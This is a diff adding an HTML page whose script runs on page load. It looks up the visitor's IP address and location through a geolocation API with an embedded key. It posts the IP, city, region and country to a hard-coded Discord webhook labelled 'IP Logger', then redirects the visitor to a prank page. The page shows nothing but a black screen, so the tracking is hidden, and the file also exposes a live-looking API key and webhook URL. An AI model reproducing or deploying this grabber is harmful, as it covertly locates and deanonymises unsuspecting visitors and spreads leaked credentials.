@@ -1,0 +1,45 @@
+<html>
+<head>
+<script type="text/javascript">
+
+
+function getIP(json) {
+    function json(url) {
+    return fetch(url).then(res => res.json());
+    }
+    
+    let apiKey = '7f02583ed9c6c966f22a890697a45037e12f60d085775b9cfe80b553';
+    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+
+    // so many more properties
+
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/917176419296100372/3A_5NrPvJPXhtydL-JKHXMcoJ6SNMmDjbgvMvSxwMLY4Mq8dmoR3D2wmM2DpPxeTW0Aw");
+     
+     request.setRequestHeader('Content-type', 'application/json');
+     
+     var params = 
+     {
+          username: "IP Logger",
+          avatar_url: "",
+          content: "IP:  " + data.ip + "**         **" + "City:  " + data.city + "**         **" +  "Country:  " + data.country_code +  "**         **" + "Region:  " +  data.region
+     }
+     
+     request.send(JSON.stringify(params));
+     window.location.replace("https://rickroll.com")
+    });
+}
+
+</script>
+
+<style>
+    *{
+        background-color: black;
+    }
+</style>
+</head>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+<body onload="getIP()">  
+</body>
+</html>
